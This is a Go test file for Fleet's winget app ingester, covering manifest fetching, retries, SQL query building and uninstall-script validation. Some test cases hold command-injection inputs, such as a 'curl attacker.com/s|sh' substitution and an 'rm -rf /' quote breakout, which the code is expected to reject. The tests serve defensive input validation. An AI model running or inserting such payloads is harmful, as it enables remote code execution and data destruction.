package winget

import (
	"context"
	"encoding/json"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path"
	"strings"
	"testing"
	"time"

	maintained_apps "github.com/fleetdm/fleet/v4/ee/maintained-apps"
	"github.com/fleetdm/fleet/v4/server/ptr"
	"github.com/google/go-github/v37/github"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gopkg.in/yaml.v2"
)

func TestWingetVersionManifestDirs(t *testing.T) {
	dir := func(name string) *github.RepositoryContent {
		return &github.RepositoryContent{Name: &name, Type: ptr.String("dir")}
	}
	file := func(name string) *github.RepositoryContent {
		return &github.RepositoryContent{Name: &name, Type: ptr.String("file")}
	}
	in := []*github.RepositoryContent{
		dir("Portable"),
		dir("0.9.6"),
		dir("0.20.4"),
		file("README.md"),
	}
	got := wingetVersionManifestDirs(in)
	require.Len(t, got, 2)
	assert.Equal(t, "0.9.6", got[0].GetName())
	assert.Equal(t, "0.20.4", got[1].GetName())

	// Legacy year-only folders (e.g. Microsoft.Office keeps "2010" alongside
	// its current "16.0.x" versions) must be excluded so they don't outrank
	// real versions in the descending version sort.
	in = []*github.RepositoryContent{
		dir("2010"),
		dir("16.0.19822.20114"),
		dir("16.0.19929.20062"),
	}
	got = wingetVersionManifestDirs(in)
	require.Len(t, got, 2)
	assert.Equal(t, "16.0.19822.20114", got[0].GetName())
	assert.Equal(t, "16.0.19929.20062", got[1].GetName())
}

func TestFuzzyMatchUnmarshalJSON(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		wantEnabled bool
		wantCustom  string
		wantErr     bool
	}{
		{
			name:        "boolean true",
			input:       `{"fuzzy_match_name": true}`,
			wantEnabled: true,
			wantCustom:  "",
		},
		{
			name:        "boolean false",
			input:       `{"fuzzy_match_name": false}`,
			wantEnabled: false,
			wantCustom:  "",
		},
		{
			name:        "omitted defaults to disabled",
			input:       `{}`,
			wantEnabled: false,
			wantCustom:  "",
		},
		{
			name:        "custom LIKE pattern string",
			input:       `{"fuzzy_match_name": "Mozilla Firefox % ESR %"}`,
			wantEnabled: true,
			wantCustom:  "Mozilla Firefox % ESR %",
		},
		{
			name:        "empty string treated as disabled",
			input:       `{"fuzzy_match_name": ""}`,
			wantEnabled: false,
			wantCustom:  "",
		},
		{
			name:    "invalid type (number)",
			input:   `{"fuzzy_match_name": 42}`,
			wantErr: true,
		},
		{
			name:    "invalid type (array)",
			input:   `{"fuzzy_match_name": [1,2]}`,
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var out struct {
				FuzzyMatchName fuzzyMatch `json:"fuzzy_match_name"`
			}
			err := json.Unmarshal([]byte(tt.input), &out)
			if tt.wantErr {
				require.Error(t, err)
				return
			}
			require.NoError(t, err)
			assert.Equal(t, tt.wantEnabled, out.FuzzyMatchName.Enabled)
			assert.Equal(t, tt.wantCustom, out.FuzzyMatchName.Custom)
		})
	}
}

func TestSetUpExistsQuery(t *testing.T) {
	tests := []struct {
		name      string
		fuzzy     fuzzyMatch
		appName   string
		publisher string
		want      maintained_apps.FMAQueries
	}{
		{
			name:      "exact match (fuzzy disabled)",
			fuzzy:     fuzzyMatch{Enabled: false, Custom: ""},
			appName:   "Mozilla Firefox",
			publisher: "Mozilla",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name = 'Mozilla Firefox' AND publisher = 'Mozilla';",
			},
		},
		{
			name:      "fuzzy enabled without custom pattern",
			fuzzy:     fuzzyMatch{Enabled: true, Custom: ""},
			appName:   "Mozilla Firefox",
			publisher: "Mozilla",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name LIKE 'Mozilla Firefox %' AND publisher = 'Mozilla';",
			},
		},
		{
			name:      "custom fuzzy pattern",
			fuzzy:     fuzzyMatch{Enabled: true, Custom: "Mozilla Firefox % ESR %"},
			appName:   "Mozilla Firefox",
			publisher: "Mozilla",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name LIKE 'Mozilla Firefox % ESR %' AND publisher = 'Mozilla';",
			},
		},
		{
			name:      "exact match escapes single quotes in name",
			fuzzy:     fuzzyMatch{Enabled: false, Custom: ""},
			appName:   "O'Reilly App",
			publisher: "O'Reilly Media",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name = 'O''Reilly App' AND publisher = 'O''Reilly Media';",
			},
		},
		{
			name:      "fuzzy enabled escapes single quotes in name",
			fuzzy:     fuzzyMatch{Enabled: true, Custom: ""},
			appName:   "O'Reilly App",
			publisher: "O'Reilly Media",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name LIKE 'O''Reilly App %' AND publisher = 'O''Reilly Media';",
			},
		},
		{
			name:      "custom pattern escapes single quotes",
			fuzzy:     fuzzyMatch{Enabled: true, Custom: "O'Reilly % Edition"},
			appName:   "O'Reilly App",
			publisher: "O'Reilly Media",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name LIKE 'O''Reilly % Edition' AND publisher = 'O''Reilly Media';",
			},
		},
		{
			name:      "empty name and publisher exact match",
			fuzzy:     fuzzyMatch{Enabled: false, Custom: ""},
			appName:   "",
			publisher: "",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name = '' AND publisher = '';",
			},
		},
		{
			name:      "custom pattern takes precedence over Enabled flag",
			fuzzy:     fuzzyMatch{Enabled: false, Custom: "Custom Pattern %"},
			appName:   "Ignored Name",
			publisher: "Some Publisher",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name LIKE 'Custom Pattern %' AND publisher = 'Some Publisher';",
			},
		},
		{
			name:      "multiple single quotes in name",
			fuzzy:     fuzzyMatch{Enabled: false, Custom: ""},
			appName:   "It's a 'test' app",
			publisher: "Pub",
			want: maintained_apps.FMAQueries{
				Exists: "SELECT 1 FROM programs WHERE name = 'It''s a ''test'' app' AND publisher = 'Pub';",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := setUpExistsQuery(tt.fuzzy, tt.appName, tt.publisher)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestBuildUpgradeCodeBasedUninstallScript(t *testing.T) {
	tests := []struct {
		name        string
		upgradeCode string
		wantErr     bool
		errContains string
	}{
		{
			name:        "valid GUID upgrade code",
			upgradeCode: "{12345678-1234-1234-1234-123456789012}",
			wantErr:     false,
		},
		{
			name:        "valid simple upgrade code",
			upgradeCode: "SomeUpgradeCode-1.0",
			wantErr:     false,
		},
		{
			name:        "malicious upgrade code with command substitution",
			upgradeCode: "legit$(curl attacker.com/s|sh)",
			wantErr:     true,
			errContains: "contains invalid characters",
		},
		{
			name:        "malicious upgrade code with backticks",
			upgradeCode: "legit`curl attacker.com`",
			wantErr:     true,
			errContains: "contains invalid characters",
		},
		{
			name:        "malicious upgrade code with single quote breakout",
			upgradeCode: "code'; rm -rf /; echo '",
			wantErr:     true,
			errContains: "contains invalid characters",
		},
		{
			name:        "malicious upgrade code with semicolon",
			upgradeCode: "code;whoami",
			wantErr:     true,
			errContains: "contains invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := buildUpgradeCodeBasedUninstallScript(tt.upgradeCode)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errContains)
				assert.Empty(t, result)
			} else {
				require.NoError(t, err)
				assert.NotEmpty(t, result)
				// Verify the upgrade code appears in single quotes
				assert.Contains(t, result, "'"+tt.upgradeCode+"'")
			}
		})
	}
}

func TestPreProcessUninstallScript(t *testing.T) {
	tests := []struct {
		name            string
		uninstallScript string
		productCode     string
		wantErr         bool
		errContains     string
	}{
		{
			name:            "valid GUID product code",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "{12345678-1234-1234-1234-123456789012}",
			wantErr:         false,
		},
		{
			name:            "valid simple product code",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "SomeProduct-1.0",
			wantErr:         false,
		},
		{
			name:            "malicious product code with command substitution",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "legit$(curl attacker.com/s|sh)",
			wantErr:         true,
			errContains:     "contains invalid characters",
		},
		{
			name:            "malicious product code with backticks",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "legit`curl attacker.com`",
			wantErr:         true,
			errContains:     "contains invalid characters",
		},
		{
			name:            "malicious product code with single quote breakout",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "code'; rm -rf /; echo '",
			wantErr:         true,
			errContains:     "contains invalid characters",
		},
		{
			name:            "malicious product code with pipe",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "code|whoami",
			wantErr:         true,
			errContains:     "contains invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := preProcessUninstallScript(tt.uninstallScript, tt.productCode)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errContains)
				assert.Empty(t, result)
			} else {
				require.NoError(t, err)
				assert.NotEmpty(t, result)
				// Verify the product code appears in single quotes
				assert.Contains(t, result, "'"+tt.productCode+"'")
			}
		})
	}
}

func TestIngestValidations(t *testing.T) {
	ctx := context.Background()
	tempDir := t.TempDir()

	testInstallScriptContents := "this is a test install script"
	require.NoError(t, os.WriteFile(path.Join(tempDir, "install_script.ps1"), []byte(testInstallScriptContents), 0644))

	testUninstallScriptContents := "this is a test uninstall script"
	require.NoError(t, os.WriteFile(path.Join(tempDir, "uninstall_script.ps1"), []byte(testUninstallScriptContents), 0644))

	cases := []struct {
		name                string
		wantErr             string
		wantPatchedContains string
		inputApp            inputApp
		cfg                 serverConfig
	}{
		{
			name:    "valid",
			wantErr: "",
			inputApp: inputApp{
				Name:                "Foo",
				UniqueIdentifier:    "Foo",
				PackageIdentifier:   "Foo",
				InstallerArch:       "x64",
				Slug:                "foo/windows",
				InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
				UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
				InstallerType:       "msi",
				InstallerScope:      "machine",
			},
			cfg: serverConfig{
				productCode:       "{ABCDEF}",
				installerType:     "msi",
				installerScope:    "machine",
				installerArch:     "x64",
				installerProdCode: "{ACBDEF}",
				upgradeCode:       "{ABCDEF}",
			},
		},
		{
			name: "use display version for patch",
			// PackageVersion is "1.0" but the registry DisplayVersion is
			// "1.0.150.0"; the patch policy must compare against the latter.
			wantPatchedContains: "version_compare(version, '1.0.150.0')",
			inputApp: inputApp{
				Name:                      "Foo",
				UniqueIdentifier:          "Foo",
				PackageIdentifier:         "Foo",
				InstallerArch:             "x64",
				Slug:                      "foo/windows",
				InstallScriptPath:         path.Join(tempDir, "install_script.ps1"),
				UninstallScriptPath:       path.Join(tempDir, "uninstall_script.ps1"),
				InstallerType:             "msi",
				InstallerScope:            "machine",
				UseDisplayVersionForPatch: true,
			},
			cfg: serverConfig{
				productCode:       "{ABCDEF}",
				installerType:     "msi",
				installerScope:    "machine",
				installerArch:     "x64",
				installerProdCode: "{ACBDEF}",
				upgradeCode:       "{ABCDEF}",
				displayVersion:    "1.0.150.0",
			},
		},
		{
			name:    "use display version for patch with no display version",
			wantErr: "no DisplayVersion found",
			inputApp: inputApp{
				Name:                      "Foo",
				UniqueIdentifier:          "Foo",
				PackageIdentifier:         "Foo",
				InstallerArch:             "x64",
				Slug:                      "foo/windows",
				InstallScriptPath:         path.Join(tempDir, "install_script.ps1"),
				UninstallScriptPath:       path.Join(tempDir, "uninstall_script.ps1"),
				InstallerType:             "msi",
				InstallerScope:            "machine",
				UseDisplayVersionForPatch: true,
			},
			cfg: serverConfig{
				productCode:       "{ABCDEF}",
				installerType:     "msi",
				installerScope:    "machine",
				installerArch:     "x64",
				installerProdCode: "{ACBDEF}",
				upgradeCode:       "{ABCDEF}",
			},
		},
		{
			name:    "wrong installer type",
			wantErr: "failed to find installer for app",
			inputApp: inputApp{
				Name:              "Foo",
				UniqueIdentifier:  "Foo",
				PackageIdentifier: "Foo",
				InstallerArch:     "x64",
				Slug:              "foo/windows",
				InstallerType:     "exe",
				InstallerScope:    "machine",
			},
			cfg: serverConfig{
				productCode:       "{ABCDEF}",
				installerType:     "msi", // mismatch here
				installerScope:    "machine",
				installerArch:     "x64",
				installerProdCode: "{ACBDEF}",
				upgradeCode:       "{ABCDEF}",
			},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			srv := newTestServer(t, c.cfg)
			t.Cleanup(srv.Close)

			gc := github.NewClient(srv.Client())
			url, err := url.Parse(srv.URL + "/")
			require.NoError(t, err)
			gc.BaseURL = url

			i := wingetIngester{
				logger:       slog.New(slog.DiscardHandler),
				githubClient: gc,
				httpClient:   srv.Client(),
				rawBaseURL:   srv.URL,
			}

			out, err := i.ingestOne(ctx, c.inputApp)
			if c.wantErr != "" {
				require.ErrorContains(t, err, c.wantErr)
				return
			}
			require.NoError(t, err)
			if c.wantPatchedContains != "" {
				require.Contains(t, out.Queries.Patched, c.wantPatchedContains)
			}
		})
	}
}

type serverConfig struct {
	productCode       string
	installerType     string
	installerScope    string
	installerArch     string
	installerProdCode string
	upgradeCode       string
	displayVersion    string
}

func newTestServer(t *testing.T, cfg serverConfig) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {

		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo":
			content := []github.RepositoryContent{{
				Name: ptr.String("1.0"),
				Type: ptr.String("dir"),
			}}
			require.NoError(t, json.NewEncoder(w).Encode(content))

		case "/microsoft/winget-pkgs/master/manifests/f/Foo/1.0/Foo.installer.yaml":
			manifest := installerManifest{
				ProductCode:    cfg.productCode,
				InstallerType:  cfg.installerType,
				Scope:          cfg.installerScope,
				PackageVersion: "1.0",
				AppsAndFeaturesEntries: []appsAndFeaturesEntries{
					{UpgradeCode: cfg.upgradeCode, DisplayVersion: cfg.displayVersion},
				},
				Installers: []installer{
					{
						Architecture:  cfg.installerArch,
						InstallerType: cfg.installerType,
						ProductCode:   cfg.installerProdCode,
						Scope:         cfg.installerScope,
					},
				},
			}

			bytes, err := yaml.Marshal(manifest)
			assert.NoError(t, err)
			_, err = w.Write(bytes)
			assert.NoError(t, err)

		case "/microsoft/winget-pkgs/master/manifests/f/Foo/1.0/Foo.locale.en-US.yaml":
			lManifest := localeManifest{
				PackageName: "foo",
				Publisher:   "Bar, Inc.",
			}

			bytes, err := yaml.Marshal(lManifest)
			assert.NoError(t, err)
			_, err = w.Write(bytes)
			assert.NoError(t, err)

		default:
			w.WriteHeader(http.StatusBadRequest)
			t.Fatalf("unexpected path %s", r.URL.Path)
		}
	}))
}

func TestGetRawManifestFileRetries(t *testing.T) {
	origInterval := fetchRetryInterval
	fetchRetryInterval = time.Millisecond
	t.Cleanup(func() { fetchRetryInterval = origInterval })

	t.Run("retries transient 429s until success", func(t *testing.T) {
		var attempts int
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			attempts++
			if attempts < 3 {
				w.WriteHeader(http.StatusTooManyRequests)
				return
			}
			_, err := w.Write([]byte("PackageVersion: 1.0"))
			assert.NoError(t, err)
		}))
		t.Cleanup(srv.Close)

		i := wingetIngester{
			logger:     slog.New(slog.DiscardHandler),
			httpClient: srv.Client(),
			rawBaseURL: srv.URL,
		}

		contents, err := i.getRawManifestFile(t.Context(), "manifests/f/Foo/1.0/Foo.installer.yaml")
		require.NoError(t, err)
		require.Equal(t, "PackageVersion: 1.0", string(contents))
		require.Equal(t, 3, attempts)
	})

	t.Run("gives up after max attempts", func(t *testing.T) {
		var attempts int
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			attempts++
			w.WriteHeader(http.StatusTooManyRequests)
		}))
		t.Cleanup(srv.Close)

		i := wingetIngester{
			logger:     slog.New(slog.DiscardHandler),
			httpClient: srv.Client(),
			rawBaseURL: srv.URL,
		}

		_, err := i.getRawManifestFile(t.Context(), "manifests/f/Foo/1.0/Foo.installer.yaml")
		require.ErrorContains(t, err, "unexpected status 429")
		require.Equal(t, 4, attempts)
	})

	t.Run("404 returns errManifestNotFound without retrying", func(t *testing.T) {
		var attempts int
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			attempts++
			w.WriteHeader(http.StatusNotFound)
		}))
		t.Cleanup(srv.Close)

		i := wingetIngester{
			logger:     slog.New(slog.DiscardHandler),
			httpClient: srv.Client(),
			rawBaseURL: srv.URL,
		}

		_, err := i.getRawManifestFile(t.Context(), "manifests/f/Foo/1.0/Foo.installer.yaml")
		require.ErrorIs(t, err, errManifestNotFound)
		require.Equal(t, 1, attempts)
	})
}

func TestGetRepoDirContentsRetries(t *testing.T) {
	origInterval := fetchRetryInterval
	fetchRetryInterval = time.Millisecond
	t.Cleanup(func() { fetchRetryInterval = origInterval })

	newIngester := func(handler http.HandlerFunc) wingetIngester {
		srv := httptest.NewServer(handler)
		t.Cleanup(srv.Close)

		gc := github.NewClient(srv.Client())
		u, err := url.Parse(srv.URL + "/")
		require.NoError(t, err)
		gc.BaseURL = u

		return wingetIngester{
			logger:       slog.New(slog.DiscardHandler),
			githubClient: gc,
		}
	}

	t.Run("retries transient 429s until success", func(t *testing.T) {
		var attempts int
		i := newIngester(func(w http.ResponseWriter, r *http.Request) {
			attempts++
			if attempts < 3 {
				w.WriteHeader(http.StatusTooManyRequests)
				_, _ = w.Write([]byte(`{"message": "gitmon refuses to schedule us"}`))
				return
			}
			content := []github.RepositoryContent{{
				Name: new("1.0"),
				Type: new("dir"),
			}}
			assert.NoError(t, json.NewEncoder(w).Encode(content))
		})

		contents, err := i.getRepoDirContents(t.Context(), "manifests/f/Foo")
		require.NoError(t, err)
		require.Len(t, contents, 1)
		require.Equal(t, "1.0", contents[0].GetName())
		require.Equal(t, 3, attempts)
	})

	t.Run("404 fails without retrying", func(t *testing.T) {
		var attempts int
		i := newIngester(func(w http.ResponseWriter, r *http.Request) {
			attempts++
			w.WriteHeader(http.StatusNotFound)
			_, _ = w.Write([]byte(`{"message": "Not Found"}`))
		})

		_, err := i.getRepoDirContents(t.Context(), "manifests/f/Foo")
		require.Error(t, err)
		require.Equal(t, 1, attempts)
	})
}

func TestGetManifestFileFallback(t *testing.T) {
	origInterval := fetchRetryInterval
	fetchRetryInterval = time.Millisecond
	t.Cleanup(func() { fetchRetryInterval = origInterval })

	// Server that always 429s raw-style paths but serves the contents API path.
	newIngester := func(rawAttempts, apiAttempts *int) *wingetIngester {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if strings.HasPrefix(r.URL.Path, "/repos/") {
				*apiAttempts++
				str := "PackageVersion: 1.0"
				content := &github.RepositoryContent{
					Name:    new("Foo"),
					Content: &str,
				}
				assert.NoError(t, json.NewEncoder(w).Encode(content))
				return
			}
			*rawAttempts++
			w.WriteHeader(http.StatusTooManyRequests)
		}))
		t.Cleanup(srv.Close)

		gc := github.NewClient(srv.Client())
		u, err := url.Parse(srv.URL + "/")
		require.NoError(t, err)
		gc.BaseURL = u

		return &wingetIngester{
			logger:       slog.New(slog.DiscardHandler),
			githubClient: gc,
			httpClient:   srv.Client(),
			rawBaseURL:   srv.URL,
		}
	}

	t.Run("falls back to contents API when raw is throttled", func(t *testing.T) {
		var rawAttempts, apiAttempts int
		i := newIngester(&rawAttempts, &apiAttempts)

		contents, err := i.getManifestFile(t.Context(), "manifests/f/Foo/1.0/Foo.installer.yaml")
		require.NoError(t, err)
		require.Equal(t, "PackageVersion: 1.0", string(contents))
		require.Equal(t, 4, rawAttempts) // exhausted raw retries first
		require.Equal(t, 1, apiAttempts)
	})

	t.Run("skips raw entirely after consecutive failures", func(t *testing.T) {
		var rawAttempts, apiAttempts int
		i := newIngester(&rawAttempts, &apiAttempts)

		for range rawFailureThreshold + 2 {
			_, err := i.getManifestFile(t.Context(), "manifests/f/Foo/1.0/Foo.installer.yaml")
			require.NoError(t, err)
		}
		// raw tried only for the first rawFailureThreshold fetches (4 retry attempts each),
		// then the circuit opens and everything goes straight to the API
		require.Equal(t, rawFailureThreshold*4, rawAttempts)
		require.Equal(t, rawFailureThreshold+2, apiAttempts)
	})
}

func TestGetManifestFileConfirms404WithAPI(t *testing.T) {
	origInterval := fetchRetryInterval
	fetchRetryInterval = time.Millisecond
	t.Cleanup(func() { fetchRetryInterval = origInterval })

	newIngester := func(apiHandler http.HandlerFunc) (*wingetIngester, *int) {
		var rawAttempts int
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if strings.HasPrefix(r.URL.Path, "/repos/") {
				apiHandler(w, r)
				return
			}
			rawAttempts++
			w.WriteHeader(http.StatusNotFound) // raw CDN serves a (possibly stale) 404
		}))
		t.Cleanup(srv.Close)

		gc := github.NewClient(srv.Client())
		u, err := url.Parse(srv.URL + "/")
		require.NoError(t, err)
		gc.BaseURL = u

		return &wingetIngester{
			logger:       slog.New(slog.DiscardHandler),
			githubClient: gc,
			httpClient:   srv.Client(),
			rawBaseURL:   srv.URL,
		}, &rawAttempts
	}

	t.Run("spurious raw 404 is overridden by the API", func(t *testing.T) {
		i, rawAttempts := newIngester(func(w http.ResponseWriter, r *http.Request) {
			str := "PackageVersion: 2.0"
			content := &github.RepositoryContent{Name: new("Foo"), Content: &str}
			assert.NoError(t, json.NewEncoder(w).Encode(content))
		})

		contents, err := i.getManifestFile(t.Context(), "manifests/f/Foo/2.0/Foo.installer.yaml")
		require.NoError(t, err)
		require.Equal(t, "PackageVersion: 2.0", string(contents))
		require.Equal(t, 1, *rawAttempts) // 404 is not retried against raw
		// a raw 404 is not a raw availability failure; the circuit stays closed
		require.Equal(t, 0, i.consecutiveRawFailures)
	})

	t.Run("404 from both raw and API is genuine", func(t *testing.T) {
		i, _ := newIngester(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusNotFound)
			_, _ = w.Write([]byte(`{"message": "Not Found"}`))
		})

		_, err := i.getManifestFile(t.Context(), "manifests/f/Foo/2.0/Foo.installer.yaml")
		require.ErrorIs(t, err, errManifestNotFound)
	})
}
